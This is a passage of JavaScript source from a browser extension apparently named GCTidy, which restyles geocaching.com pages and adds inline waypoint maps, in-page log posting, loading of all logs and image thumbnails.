						guid: anchor.attr('href').match(/img\.geocaching\.com\/track\/log\/([^\.]*\.(?:jpg|gif|png))/i)[1],
						title: anchor.text()
					};
					var description = anchor.next('br').next('span');
					if (description.length && $.trim(description.text())) {
						image.description = description.text().replace(/\n/g, '<br />');
					}
					log.images.push(image);
				});
				logs.push(log);
			});
			return logs;
		}
	},
	YourProfilePage: {
		META: {
			title: 'Your Profile'
		},
		OPTIONS: [
			{name: 'narrow_sidebar', title: 'Narrow sidebar', type: 'bool', defaultValue: false},
			{name: 'hide_state_country', title: 'Hide state/country', type: 'bool', defaultValue: false},
			{name: 'hide_cache_trackable_image', title: 'Hide cache type/trackable image', type: 'bool', defaultValue: false},
			{name: 'alternative_layout', title: 'Alternative table layout', type: 'bool', defaultValue: true}
		],
		STYLE:
			'.yui-u:first-child table td:nth-child(5) {white-space: nowrap;}' +
			'h3.WidgetHeader {padding: 0.2em 1em 0.25em;}' +
			'h3.WidgetHeader table {border-spacing: 0;}' +
			'h3.WidgetHeader td {padding: 0;}' +
			'h3.WidgetHeader td:nth-child(2) {text-transform: uppercase;}' +
			'h3.WidgetHeader td:nth-child(2) a {text-decoration: none; font-weight: normal;}' +
			'h3.widget-header a img {vertical-align: baseline; padding-top: 3px;}' +
			'.gctidy-narrow-sidebar .yui-gc .yui-u {width: 27.3%; }' +
			'.gctidy-narrow-sidebar .yui-gc .yui-u.first {width: 70.7%; }' +
			'.gctidy-state-country {color: #8D98A8; }' +
			'.gctidy-hide-image tr td:nth-child(3) img, .gctidy-alternative-layout tr td:nth-child(3) img {display: none;}' +
			'.gctidy-hide-state-contry tr td:nth-child(4), .gctidy-alternative-layout tr td:nth-child(4) {display: none;}' +
			'.gctidy-alternative-layout tr td:nth-child(3) {background-repeat: no-repeat; background-position: 0.5em 50%; padding-left: 2.4em;}' +
			'.gctidy-alternative-layout.gctidy-hide-image tr td:nth-child(3) {padding-left: 0.5em;}' +
			'',
		process: function() {
			var logs = $('#Content .yui-u:first table');
			var rows = logs.find('tr');

			if (this.get('narrow_sidebar')) {
				$('body').addClass('gctidy-narrow-sidebar');
			}
			var hideStateCountry = this.get('hide_state_country');
			var hideImage = this.get('hide_cache_trackable_image');
			var alternativeLayout = this.get('alternative_layout');
			
			var trackableRe = /^http:\/\/www\.geocaching\.com\/track\//;
			
			function toggleTableClasses() {
				logs.toggleClass('gctidy-hide-state-contry', hideStateCountry);
				logs.toggleClass('gctidy-hide-image', hideImage);
				logs.toggleClass('gctidy-alternative-layout', alternativeLayout);
			}
			function worker(i) {
				var row = $(rows[i]);
				var col2 = row.find('td:eq(2)');
				var a = col2.find('a');
				
				$(a[0]).replaceWith('You');

				if (alternativeLayout) {
					if (!hideStateCountry) {
						var stateCountry = row.find('td:eq(3)').text();
						col2.append('<br /><span class="gctidy-state-country">' + stateCountry + '</span>');
					}
					if (!hideImage) {
						var image = col2.find('img').attr('src');
						col2.css('background-image', 'url(' + image + ')');
					}
				}
				
				var trackable = $(a[2]);
				if (trackableRe.test(trackable.attr('href'))) {
					trackable.after('<br />');
				}
				
				row.find('td:eq(4) a').text('Log');
			}
			function threading() {
				var logsClone = logs.clone().insertAfter(logs);
				logs.hide();
				toggleTableClasses();
				
				GCTidy.threading({
					len: rows.length,
					steps: 50,
					worker: worker,
					success: function() {
						logs.show();
						logsClone.remove();
					}
				});
			}
			
			if (rows.length < 200) {
				toggleTableClasses();
				for (var i = 0, len = rows.length; i < len; i++) {
					worker(i);
				}
			}
			else {
				setTimeout(threading, 0);
			}

			GCTidy.Settings.set('home_coordinates', this.getHomeCoordinates());
			GCTidy.Settings.set('basic_member', this.getBasicMemberStatus());
			GCTidy.Settings.set('user_guid', this.getUserGuid());
		},
		getHomeCoordinates: function() {
			var homeCoordinatesHref = $('#ctl00_ContentBody_hlHomeLocationMapIt').attr('href') || '';
			var homeCoordinates = homeCoordinatesHref.match(/lat=[\d\.]+&lng=[\d\.]+/);
			return homeCoordinates ? homeCoordinates[0] : '';
		},
		getBasicMemberStatus: function() {
			return !!$('#memberStatus').text().match(/Basic Member/);
		},
		getUserGuid: function() {
			var guidHref = $('#Content .yui-g:eq(1) a[href^="/track/search.aspx?o=1&uid="]').attr('href') || '';
			var guid = guidHref.match(/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/);
			return guid ? guid[0] : '';
		}
	},
	YourLogsPage: {
		process: function() {
			$('#ctl00_ContentBody_lbLogFilters').prev('strong').contents().unwrap();
		}
	},
	YourCacheLogsPage: {
		process: function() {
			$('#ctl00_ContentBody_lbLogFilters').prev('strong').contents().unwrap();
		}
	},
	YourTrackableLogsPage: {
		process: function() {
			$('#ctl00_ContentBody_lbLogFilters').prev('strong').contents().unwrap();
		}
	}
};

GCTidy.PageExtensions = {
	InlineMaps: {
		PAGES: /^CacheDetailsPage/,
		PAGE_PROCESSING_REQUIRED: true,
		SETTINGS: [
			{name: 'coords_map_height', type: 'number', defaultValue: 400},
			{name: 'waypoints_map_height', type: 'number', defaultValue: 400}
		],
		STYLE: 
			'#gctidy-small-map.hidden {height: 0; margin-top: 0; overflow: hidden;}' +
			'#gctidy-small-map-enlarge {width: 28px; height: 27px; position: absolute; top: 0; right: 0; background: white url(data:image/gif;base64,R0lGODlhDwAPAIAAANnZ2f///yH5BAAAAAAALAAAAAAPAA8AAAIfjA95ywkMg4tNUWSvzNj5D4bi+FSlNmnbeaUoR7lHAQA7) 58% 45% no-repeat; -webkit-border-bottom-left-radius: 4px; -moz-border-radius-bottomleft: 4px; -webkit-box-shadow: rgba(0,0,0,0.3) -1px 1px 2px; -moz-box-shadow: rgba(0,0,0,0.3) -1px 1px 2px; cursor: pointer;}' +
			'#gctidy-coords-map-container td {border-bottom:1px solid #c0cee3; padding: 1px 1px 3px;}' +
			'#gctidy-waypoints-map-container {border:1px solid #d7d7d7; position: relative; margin: 1.5em 0 -1.5em;}' +
			'#gctidy-coords-map, #gctidy-waypoints-map {height: 400px;}' +
			'#gctidy-coords-map-close, #gctidy-waypoints-map-close {width: 33px; height: 32px; position: absolute; top: 0; right: 0; background: white url(data:image/gif;base64,R0lGODlhDgAOAIAAAP///9nZ2SH5BAAAAAAALAAAAAAOAA4AAAIgBGKZaOHanptqShtptnrxBx1cuIHQZ5Zjya5tmi3kYRQAOw==) 58% 45% no-repeat; -webkit-border-bottom-left-radius: 6px; -moz-border-radius-bottomleft: 6px; -webkit-box-shadow: rgba(0,0,0,0.4) -1px 1px 2px; -moz-box-shadow: rgba(0,0,0,0.4) -1px 1px 2px; cursor: pointer;}' +
			'#gctidy-waypoints-map-close {background-position: 50% 50%;}' +
			'.gctidy-waypoint-infowindow-text {font-size: 85%;}' +
			'.gctidy-waypoint-infowindow-text p {margin: 1em 0 0;}' +
			'.gctidy-waypoint-infowindow-text p:first-child {margin-top: 0; margin-right: 2em; white-space: nowrap;}' +
			'.gctidy-waypoint-infowindow-text p.gctidy-waypoint-cache-title {margin-bottom: 3em;}' +
			'.gctidy-waypoint-infowindow-text i {color:#999;}' +
			'.gctidy-google-maps-coords-control {font-size: 85%; color: #444; padding: 0 5px 1px 6px; border-radius: 3px; -moz-border-radius: 3px; background: white; margin: 0 6px 0 0;}' +
			'#gctidy-coords-map > div:nth-child(1) > div:nth-child(8), #gctidy-waypoints-map > div:nth-child(1) > div:nth-child(8) {right: 39px !important; top: 1px !important;}' +
			'',
		process: function(page) {
			var waypoints = page.getCoordsAndAdditionalWaypoints();
			if (!waypoints) {
				return;
			}
			$('#gctidy-small-map h3').append(' <span style="font-weight: normal;">(<a href="#">Enlarge</a>)</span>');
			$('#gctidy-small-map-link').attr('title', 'Enlarge map').append('<div id="gctidy-small-map-enlarge"></div>');
			if ($('#ctl00_ContentBody_Waypoints').length) {
				$('#ctl00_ContentBody_WaypointsInfo').after(' (<a id="gctidy-open-waypoints-map" href="#">View on map</a><a id="gctidy-close-waypoints-map" style="display: none;" href="#">Hide map</a>)');
			}

			var waypointsScript = '';
			$.each(waypoints, function(i, waypoint) {
				waypointsScript += (
					"{" +
					"lat: " + waypoint.lat + ", " +
					"lng: " + waypoint.lng + ", " +
					"type: '" + waypoint.type + "', " +
					"title: '" + waypoint.name.replace(/'/g, "\\'") + (waypoint.type == 'Cache' ? "', " : " (" + waypoint.type + ")', ") +
					"html: '<div class=\"gctidy-waypoint-infowindow-text\">" + waypoint.html.replace(/'/g, "\\'") + "</div>'" +
					((i == waypoints.length - 1) ? "}" : "}, ")
				);
			});
			GCTidy.appendScript('text', 'GCTidyWaypoints = [' + waypointsScript + '];');
			
			this.googleMapsAPILoaded = false;
			this.maps = {};
			
			$('#gctidy-small-map a').click($.proxy(function() {
				this.onOpenMap('coords-map');
				return false;
			}, this));
			$('#gctidy-open-waypoints-map').click($.proxy(function() {
				this.onOpenMap('waypoints-map');
				return false;
			}, this));
		},
		onOpenMap: function(mapType) {
			switch (mapType) {
				case 'coords-map': 
					$('#gctidy-small-map').addClass('hidden'); 
					break;
				case 'waypoints-map':
					$('#gctidy-open-waypoints-map').hide(); 
					$('#gctidy-close-waypoints-map').show(); 
					break;
			}
			if (!this.maps[mapType]) {
				this.addMap(mapType);
				this.maps[mapType] = true;
			}
			else {
				$('#gctidy-' + mapType + '-container').show();
				GCTidy.appendScript('text', 'google.maps.event.trigger(GCTidy.maps["' + mapType + '"], "resize");');
			}
			return false;
		},
		onCloseMap: function(mapType) {
			switch (mapType) {
				case 'coords-map': 
					$('#gctidy-small-map').removeClass('hidden'); 
					break;
				case 'waypoints-map':
					$('#gctidy-open-waypoints-map').show(); 
					$('#gctidy-close-waypoints-map').hide(); 
					break;
			}
			$('#gctidy-' + mapType + '-container').hide();
		},
		addMap: function(mapType) {
			var callback;
			switch (mapType) {
				case 'coords-map':
					$('#ctl00_ContentBody_LatLon').closest('tr').after('<tr id="gctidy-coords-map-container"></tr>');
					$('#gctidy-coords-map-container').append('<td><div style="position: relative;"><div id="gctidy-coords-map"></div><div id="gctidy-coords-map-close" title="Close map"></div></div></td>');
					callback = 'GCTidyAddCoordsMap';
					break;
				case 'waypoints-map':
					$('#ctl00_ContentBody_Waypoints').before('<div id="gctidy-waypoints-map-container"><div id="gctidy-waypoints-map"></div><div id="gctidy-waypoints-map-close" title="Close map"></div></div>');
					$('#gctidy-close-waypoints-map').click($.proxy(function() {
						this.onCloseMap(mapType);
						return false;
					}, this));
					callback = 'GCTidyAddWaypointsMap';
					break;
			}
			$('#gctidy-' + mapType + '-close').click($.proxy(function() {
				this.onCloseMap(mapType);
				return false;
			}, this));
			
			var mapHeightSettingsProperty = mapType.replace('-', '_') + '_height';
			var map = $('#gctidy-' + mapType);
			map.css('height', this.get(mapHeightSettingsProperty) + 'px');
			map.gctidyVerticalResizer({
				minHeight: 200,
				onResizeEnd: $.proxy(function() {
					GCTidy.appendScript('text', 'google.maps.event.trigger(GCTidy.maps["' + mapType + '"], "resize");');
					this.set(mapHeightSettingsProperty, map.height());
				}, this)
			});
			
			var script = 
				'function GCTidyAddCoordsMap() {' + 
				'	GCTidy.addMap("coords-map");' + 
				'}' + 
				'function GCTidyAddWaypointsMap() {' + 
				'	GCTidy.addMap("waypoints-map");' + 
				'}' + 
				'GCTidy = typeof GCTidy != "undefined" ? GCTidy : {};' + 
				'GCTidy.maps = {};' + 
				'' + 
				'GCTidy.addMap = (function() {' + 
				'	var mapMapnik, mapCycle;' + 
				'	var iconYellow, iconGreen, iconBlue, iconGrey, shadow;' + 
				'	var zeroPad = function(v, a, b) {' + 
				'		v = String(v * Math.pow(10, a) + Math.pow(10, a+b));' +
				'		return v.substr(1, b) + (a ? "." + v.substr(b + 1) : "");' + 
				'	};' + 
				'	var latlngDeg2Coords = function(lat, lng) {' + 
				'		var latAbsDeg = Math.floor(Math.abs(lat));' + 
				'		var lngAbsDeg = Math.floor(Math.abs(lng));' + 
				'		var coords = "";' + 
				'		coords += (lat >= 0 ? "N " : "S ") + zeroPad(latAbsDeg, 0, 2) + "° " + zeroPad(Math.floor((Math.abs(lat) - latAbsDeg) * 60000) / 1000, 3, 2) + " ";' + 
				'		coords += (lng >= 0 ? "E " : "W ") + zeroPad(lngAbsDeg, 0, 3) + "° " + zeroPad(Math.floor((Math.abs(lng) - lngAbsDeg) * 60000) / 1000, 3, 2);' + 
				'		return coords;' + 
				'	};' + 
				'	return function(mapType) {' + 
				'		if (!mapMapnik) {' + 
				'			mapMapnik = new google.maps.ImageMapType({' + 
				'				getTileUrl: function(ll, zoom) {' +
				'					return "http://" + ["a", "b", "c"][(ll.x+ll.y)%3] + ".tile.openstreetmap.org/" + zoom + "/" + (ll.x % (1 << zoom)) + "/" + ll.y + ".png";' + 
				'				},' + 
				'				tileSize: new google.maps.Size(256, 256),' + 
				'				isPng: true,' + 
				'				maxZoom: 18,' + 
				'				name: "OSM Road",' + 
				'				alt: "OpenStreetMap",' + 
				'			});' + 
				'			mapCycle = new google.maps.ImageMapType({' + 
				'				getTileUrl: function(ll, zoom) {' +
				'					return "http://" + ["a", "b", "c"][(ll.x+ll.y)%3] + ".andy.sandbox.cloudmade.com/tiles/cycle/" + zoom + "/" + (ll.x % (1 << zoom)) + "/" + ll.y + ".png";' + 
				'				},' + 
				'				tileSize: new google.maps.Size(256, 256),' + 
				'				isPng: true,' + 
				'				maxZoom: 18,' + 
				'				name: "OSM Cycle",' + 
				'				alt: "OpenStreetMap",' + 
				'			});' + 
				'' + 
				'			iconYellow = "http://maps.gstatic.com/intl/de_de/mapfiles/ms/micons/yellow.png";' + 
				'			iconGreen = "http://maps.gstatic.com/intl/de_de/mapfiles/ms/micons/green.png";' + 
				'			iconBlue = "http://maps.gstatic.com/intl/de_de/mapfiles/ms/micons/blue.png";' + 
				'			iconGrey = "http://maps.gstatic.com/intl/de_de/mapfiles/ms/micons/grey.png";' + 
				'			shadow = new google.maps.MarkerImage(' +
				'				"http://maps.gstatic.com/intl/de_de/mapfiles/markers/marker_sprite.png",' +
				'				new google.maps.Size(28, 34),' +
				'				new google.maps.Point(29, 0),' +
				'				new google.maps.Point(2, 34)' +
				'			);' +
				'		}' + 
				'' + 
				'		var map = new google.maps.Map(document.getElementById("gctidy-" + mapType), {' +
				'			zoom: 13,' +
				'			center: new google.maps.LatLng(GCTidyWaypoints[0].lat, GCTidyWaypoints[0].lng),' +
				'			mapTypeId: google.maps.MapTypeId.ROADMAP,' +
				'			mapTypeControlOptions: {' +
				'				mapTypeIds: [google.maps.MapTypeId.ROADMAP, google.maps.MapTypeId.SATELLITE, google.maps.MapTypeId.HYBRID, google.maps.MapTypeId.TERRAIN, "mapnik", "cycle"]' +
				'			},' +
				'			scaleControl: true' +
				'		});' +
				'		map.mapTypes.set("mapnik", mapMapnik);' +
				'		map.mapTypes.set("cycle", mapCycle);' +
				'' +
				'		var infoWindow = new google.maps.InfoWindow({' +
				'			maxWidth: 400' +
				'		});' +
				'		google.maps.event.addListener(map, "click", function() {' + 
				'			infoWindow.close();' + 
				'		});' + 
				'' +
				'		var streetView = map.getStreetView();' +
				'		google.maps.event.addListener(streetView, "visible_changed", function() {' + 
				'			jQuery("#gctidy-" + mapType + "-close").toggle(!streetView.getVisible());' + 
				'		});' + 
				'' +
				'		var coordsControl = jQuery("<div></div>")' +
				'			.addClass("gctidy-google-maps-coords-control");' +
				'		google.maps.event.addListener(map, "mousemove", function(event) {' + 
				'			coordsControl.text(latlngDeg2Coords(event.latLng.lat(), event.latLng.lng()));' + 
				'		});' +
				'		map.controls[google.maps.ControlPosition.RIGHT_BOTTOM].push(coordsControl[0]);' +
				'' +
				'		jQuery.each(GCTidyWaypoints, function() {' + 
				'			var waypoint = this;' + 
				'			var marker;' + 
				'			var icon;' + 
				'			switch (waypoint.type) {' + 
				'				case "Stages of a Multicache":' + 
				'				case "Question to Answer":' + 
				'					icon = iconYellow; break;' + 
				'				case "Trailhead":' + 
				'					icon = iconGreen; break;' + 
				'				case "Parking Area":' + 
				'					icon = iconBlue; break;' + 
				'				case "Reference Point":' + 
				'					icon = iconGrey; break;' + 
				'			}' + 
				'			waypoint.latlng = new google.maps.LatLng(waypoint.lat, waypoint.lng);' + 
				'			marker = new google.maps.Marker({' +
				'				position: waypoint.latlng,' +
				'				title: waypoint.title,' +
				'				map: map,' +
				'				icon: icon,' +
				'				shadow: icon ? shadow : null' +
				'			});' +
				'			google.maps.event.addListener(marker, "click", function() {' + 
				'				infoWindow.setContent(waypoint.html);' + 
				'				infoWindow.open(map, marker);' + 
				'			});' + 
				'		});' + 
				'' + 
				'		if (mapType == "waypoints-map") {' + 
				'			var bounds = new google.maps.LatLngBounds();' + 
				'			jQuery.each(GCTidyWaypoints, function() {' + 
				'				bounds.extend(this.latlng);' + 
				'			});' + 
				'			map.fitBounds(bounds);' + 
				'			map.setZoom(Math.min(map.getZoom(), 16));' + 
				'		}' + 
				'' + 
				'		GCTidy.maps[mapType] = map;' + 
				'	};' +
				'})();';
			if (!this.googleMapsAPILoaded) {
				GCTidy.appendScript('text', script);
				this.googleMapsAPILoaded = true;
			}
			GCTidy.appendScript('text', callback + '();');
		}
	},
	InlineLogPosting: {
		PAGES: /^CacheDetailsPage/,
		PAGE_PROCESSING_REQUIRED: true,
		PAGE_OPTION: 'inline_log_posting',
		STYLE:
			'#gctidy-log-button {float: right; background: #f9f9f9; border: 1px solid #ccc; padding:0.25em 1em 0.35em 0.7em; -webkit-border-radius: 16px; -moz-border-radius: 16px; margin-top: -1.7em; cursor: pointer; background:-moz-linear-gradient(top, #fff, #eaeaea); background:-webkit-gradient(linear, left top, left bottom, from(#fff), to(#eaeaea));}' +
			'#gctidy-log-button:hover {border: 1px solid #888;}' +
			'#gctidy-log-button:active {background: #eee;}' +
			'#gctidy-log-button img {vertical-align: bottom;}' +
			'#gctidy-log-container {margin: 2em 0 2.5em -0.75em; border-left: 0.75em solid #ffffdd; background: #ffffdd; position: relative; height: 55px; overflow: hidden;}' +
			'#gctidy-log-container .gctidy-spinner {position: absolute; top: 42%; left: 48%;}' +
			'#gctidy-log-container p {padding: 0 0 0 0.75em;}' +
			'#gctidy-log-iframe {width: 100%; border: none; height: 500px; overflow: hidden;}' +
			'',
		process: function(page) {
			this.logLink = $('.CacheDetailNavigationWidget a[href^="/seek/log.aspx"]');
			if (this.logLink.length) {
				this.logUrl = this.logLink.attr('href');
				this.logButton = $('<div id="gctidy-log-button"><img src="http://www.geocaching.com/images/stockholm/16x16/add_comment_with_check.gif"> Log your visit</div>')
					.appendTo('#ctl00_ContentBody_lblFindCounts');
				this.logLink.click($.proxy(this.showIframe, this));
				this.logButton.click($.proxy(this.showIframe, this));
				this.page = page;
			}
		},
		showIframe: function(event) {
			if (this.container) {
				this.container.show();
				this.iframe.contents().find('#ctl00_ContentBody_LogBookPanel1_ddLogType').focus();
			}
			else {
				this.loadIframe();
			}
			this.logButton.hide();
			if ($(event.target).closest('.CacheDetailNavigationWidget').length) {
				$('#ctl00_ContentBody_lblFindCounts').prev('h3').gctidyScrollTo(300, -25);
			}
			return false;
		},
		hideIframe: function() {
			this.container.hide();
			this.logButton.show();
			return false;
		},
		loadIframe: function(page, url) {
			this.savedLogText = '';
			this.error = false;
			this.spinner = $('<img class="gctidy-spinner" src="http://www.geocaching.com/images/loading2.gif" />');

			this.container = $('<div id="gctidy-log-container"></div>')
				.hide()
				.insertAfter(this.logButton)
				.slideDown(300)
				.append(this.spinner);
			this.iframe = $('<iframe id="gctidy-log-iframe"></iframe>')
				.hide()
				.appendTo(this.container)
				.attr('src', this.logUrl)
				.load($.proxy(this.onIframeLoad, this));
		},
		onIframeLoad: function() {
			this.spinner.detach();
			
			var doc = this.iframe.contents();
			if (doc.find('#ctl00_ContentBody_LogBookPanel1_EditLogPanel').length) {
				// Post log page
				GCTidy.appendScript('text',
					'window.addEventListener("unload", function() {' +
					'	var event = document.createEvent("Event");' +
					'	event.initEvent("GCTidyLogPageUnload", false, false);' +
					'	document.dispatchEvent(event);' +
					'}, false);',
					doc[0]
				);
				doc.bind('GCTidyLogPageUnload', $.proxy(this.onIframeUnload, this));
				
				if (this.error) {
					this.error = false;
					doc.find('#ctl00_ContentBody_LogBookPanel1_tbLogInfo').val(this.savedLogText);
				}
				this.processIframe();
			}
			else if (doc.find('#ctl00_ContentBody_LogBookPanel1_ViewLogPanel').length) {
				// View log page
				this.iframe.hide();
				this.container
					.append('<p>Log entry submitted. Loading logs...</p>')
					.append(this.spinner)
					.animate({height: 55}, 300);

				this.page.loadLogs({
					all: $('table.LogsTable + p a').length ? false : true,
					dim: true,
					complete: $.proxy(function() {
						this.container.slideUp(300, $.proxy(function() {
							this.container.remove();
							this.container = this.iframe = null;
							this.logButton.show();
						}, this));
					}, this)
				});
			}
			else {
				// Error
				this.error = true;

				this.iframe.hide();
				this.container.animate({height: 55}, 300);
				
				var message = $('<p>Error loading page. <a href="#">Go back</a></p>').appendTo(this.container);
				message.find('a').click($.proxy(function() {
					message.remove();
					this.spinner.appendTo(this.container);
					GCTidy.appendScript('text',
						'if (window.back) {' +
							'window.back();' +
						'}' +
						'else {' +
							'window.location = "' + this.logUrl + '";' +
						'}' +
						'',
						doc[0]
					);
					return false;
				}, this));
			}
		},
		onIframeUnload: function() {
			var textarea = this.iframe.contents().find('#ctl00_ContentBody_LogBookPanel1_tbLogInfo');
			if (textarea.length) {
				this.savedLogText = textarea.val();
			}
			this.iframe.hide();
			this.spinner.appendTo(this.container);
		},
		processIframe: function() {
			var container = this.container;
			var iframe = this.iframe;
			var doc = iframe.contents();
			
			if (ENVIRONMENT == 'chrome') {
				GCTidy.init(doc[0]);
			}
			
			GCTidy.appendStyle(
				'html {background: none; overflow: hidden;}' +
				'body {padding: 0; background: none;}' +
				'#bd {background: none;}' +
				'#doc3 {margin: 0; min-width: inherit;}' +
				'#hd, #ft, #Navigation, .BreadcrumbsWidget, #uservoice-feedback, .WarningMessage.DownTime {display: none;}' +
				'.yui-t1 #yui-main .yui-b {margin-left: 0;}' +
				'#Content {padding: 0 1.5em 1em 0.5em;}' +
				'h2 {margin-top: 1em;}' +
				'#ctl00_ContentBody_LogBookPanel1_EditLogPanel dl {margin-top: 1.5em;}' +
				'.gctidy-in-reference-to {display: none;}' +
				'#ctl00_ContentBody_LogBookPanel1_LogButton {margin: 0.25em 0 0.5em;}' +
				'#gctidy-cancel-button {margin-left: 0.5em;}' +
				// GCBBCode
				'#calendarTable {display: none;}' +
				'',
				doc
			);
			
			$('<input type="button" id="gctidy-cancel-button" value="Cancel">')
				.insertAfter(doc.find('#ctl00_ContentBody_LogBookPanel1_LogButton'))
				.click($.proxy(this.hideIframe, this));
			doc.find('#ctl00_ContentBody_LogBookPanel1_ddLogType').focus();
			
			iframe.show();

			// Iframe resize
			function onResize(event) {
				var height = doc.find('body').height();
				iframe.height(height);
				if (!event) {
					container.animate({height: height}, 300);
				}
				else {
					container.height(height);
				}
			}
			function onMouseDown(event) {
				doc.mousemove(onResize);
				doc.mouseup(onMouseUp);
			}
			function onMouseUp(event) {
				doc.unbind('mousemove', onResize);
				doc.unbind('mouseup', onMouseUp);
			}

			function onDOMNodeInserted(event) {
				var target = $(event.target);
				// Resizer
				if (target.hasClass('gctidy-vertical-resizer')) {
					doc.find('.gctidy-vertical-resizer').mousedown(onMouseDown);
					onResize();
				}
				// GCVote
				if (target.hasClass('gctidy-gcvote')) {
					setTimeout(function() {
						onResize();
					}, 0);
				}
			}
			var resizer = doc.find('.gctidy-vertical-resizer');
			if (resizer.length) {
				onDOMNodeInserted({target: resizer});
			}
			else if (!GCTidy.Settings.get('page_CachePostLogPage')) {
				onResize();
			}
			
			doc.find('#ctl00_ContentBody_LogBookPanel1_EditLogPanel').bind('DOMNodeInserted', onDOMNodeInserted);
			doc.find('#ctl00_ContentBody_LogBookPanel1_LogButton').click(onResize);
			doc.find('#gctidy-log-type-date select').change(onResize);
		}
	},
	LoadAllLogs: {
		PAGES: /^CacheDetailsPage/,
		PAGE_PROCESSING_REQUIRED: true,
		PAGE_OPTION: 'load_all_logs',
		process: function(page) {
			var moreLinkBottom, moreLinkTop;
			var fetching = false;
			
			function fetchLogs(event) {
				if (fetching) {
					return false;
				}
				fetching = true;

				var targetAnchor = $(event.target).closest('a');
				var spinner = $('<img class="gctidy-spinner" src="http://www.geocaching.com/images/loading2.gif" style="vertical-align: text-bottom;" />');
				targetAnchor.after(spinner).after('<span>&nbsp;</span>');

				page.loadLogs({
					all: true,
					success: function() {
						moreLinkBottom.closest('p').remove();
						moreLinkTop && moreLinkTop.parent('p').remove();
					},
					error: function(xmlHttpRequest, textStatus) {
						targetAnchor.after(' Error: ' + textStatus + ' ' + xmlHttpRequest.status);
					},
					complete: function() {
						fetching = false;
						spinner.remove();
					}
				});
				return false;
			}

			moreLinkBottom = $('table.LogsTable + p a');
			moreLinkBottom.click(fetchLogs);

			// GC VIP List
			page.handleGCVipList(function() {
				moreLinkTop = $('a[href="/about/glossary.aspx#spoiler"]').parent('p').next('p').find('a');
				moreLinkTop.click(fetchLogs);
				$('#VIP_table .VIP_warning_row a').click(fetchLogs);
				$(document).bind('GCVIPListCachePageListUpdate', function() {
					$('#VIP_table .VIP_warning_row a').click(fetchLogs);
				});
			});
		}
	},
	ImageThumbnails: {
		PAGES: /^CacheDetailsPage|^TrackableDetailsPage|TrackableMapPage/,
		META: {
			title: 'Image thumbnails',
			description: 'Replaces image links with thumbnails (Cache Details Page, Trackable Details Page, Trackable Map Page)'
		},
		STYLE: 
			'#gctidy-additional-images {margin-top: 2.5em; margin-bottom: 2em;}' +
			'#gctidy-trackable-images {width: 600px;}' +
			'.gctidy-shadow-thumbnails {overflow: hidden; padding: 0 0 4px 2px;}' +
			'.gctidy-log-images {overflow: hidden; margin: -0.5em -1em 1.4em 1.7em;}' +
			'.gctidy-trackable-log-images {margin: -0.9em -1em 1.7em 1.5em;}' +
			'.gctidy-image p {margin-top: 0; font-size: 85%;}' +
			'.gctidy-thumbnail a {text-decoration: none;}' +
			'.gctidy-spoiler {color: #ddd; font-size: 500%;}' +
			'#gctidy-additional-images .gctidy-image {width: 348px;}' +
			'#gctidy-trackable-images .gctidy-image {width: 250px; margin: 0.5em 2em 1em 0;}' +
			'.gctidy-shadow-thumbnails .gctidy-image {float: left; margin: 1.5em 2em 0 0;}' +
			'.gctidy-shadow-thumbnails .gctidy-thumbnail {float: left; margin-right: 0.9em; -webkit-border-radius: 5px; -webkit-box-shadow: #bbb 1px 1px 5px; -moz-box-shadow: #bbb 1px 1px 5px; -moz-border-radius: 5px;}' +
			'.gctidy-shadow-thumbnails .gctidy-thumbnail a {width: 100px; height: 90px; text-align: center; display: table-cell; vertical-align: middle;}' +
			'.gctidy-shadow-thumbnails .gctidy-thumbnail img {max-width: 100px; max-height: 90px;}' +
			'.gctidy-shadow-thumbnails .gctidy-spoiler {line-height: 40px;}' +
			'.gctidy-log-images .gctidy-image {width: 175px; margin: 1.5em 1em 0 0; display: inline-block; vertical-align: top;}' +
			'.gctidy-log-images .gctidy-image p {margin-top: 0.3em; line-height: 1.3;}' +
			'.gctidy-log-images .gctidy-image p a {text-decoration: none; font-weight: bold; color: #424242;}' +
			'.gctidy-log-images .gctidy-image p a:link, .gctidy-log-images .gctidy-image p a:visited {color: #424242 !important;}' +
			'.gctidy-log-images .gctidy-image img {max-width: 140px; max-height: 130px;}' +
			'.gctidy-log-images .gctidy-thumbnail {width: 140px; height: 130px; border: 0px solid #ddd; display: table-cell; vertical-align: bottom;}' +
			'.gctidy-log-images .gctidy-thumbnail a {display: inline-block;}' +
			'.gctidy-log-images .gctidy-thumbnail a.gctidy-log-url {display: none;}' +
			'.gctidy-log-images .gctidy-spoiler {padding: 0 0.8em;}' +
			'.fancybox-title-inside {font-weight: bold; text-align: left !important;}' +
			'.fancybox-title-inside span {font-weight: normal;}' +
			'.fancybox-title-inside a {font-size: 90%; font-weight: normal; color: #003399; margin-left: 0.5em;}' +
			'.fancybox-title-inside a:hover {color: #FF6600;}' +
			'.fancybox-title-inside .gctidy-print-picture {float: right;}' +
			'.AlternatingRow .gctidy-log-images .gctidy-thumbnail {border-color: #C0CEE3; }',
		process: function(page, pageType) {
			switch (pageType) {
				case 'CacheDetailsPage':
					this.processCacheAdditionalImages(page.getAdditionalImages());
					this.processCacheLogImages(page.getLogImages());
					$(document).bind('GCTidyCacheLogsUpdate', $.proxy(function() {
						this.processCacheLogImages(page.getLogImages());
					}, this));
					break;
				case 'TrackableDetailsPage':
					this.processTrackableImages(page.getTrackableImages());
					break;
				case 'TrackableMapPage':
					this.processTrackableMapLogImages(page.getLogImages());
					break;
			}
		},
		processCacheAdditionalImages: function(images) {
			if (!images.length) {
				return;
			}
			$('#ctl00_ContentBody_Images a').removeAttr('rel');
			$('#ctl00_ContentBody_Images').parent('p').hide().before('<div id="gctidy-additional-images"><p><strong>Additional Images</strong></p><div class="gctidy-shadow-thumbnails"></div></div>');
			var container = $('#gctidy-additional-images > div');
			
			$.each(images, $.proxy(function(i, image) {
				var source = 'http://img.geocaching.com/cache/' + image.guid;
				var thumbnail = this.buildThumbnail(image, source, source);
				thumbnail.appendTo(container);
			}, this));
			
			if (images.length == 1) {
				container.find('.gctidy-image').css('width', '100%');
			}
			GCTidy.appendScript('text', 'jQuery("#gctidy-additional-images .gctidy-thumbnail a").fancybox(' + this.getFancyboxOptions() + ');');
		},
		processCacheLogImages: function(logs) {
			$.each(logs, $.proxy(function(i, log) {
				var container = $('<div class="gctidy-log-images"></div>');
				log.table.find('a').removeAttr('rel');
				log.table.hide().next('br').remove();
				var small = log.table.closest('td').find('small:last');
				small.prev('br').remove();
				small.before(container);
				
				$.each(log.images, $.proxy(function(j, image) {
					var source = 'http://img.geocaching.com/cache/log/' + image.guid;
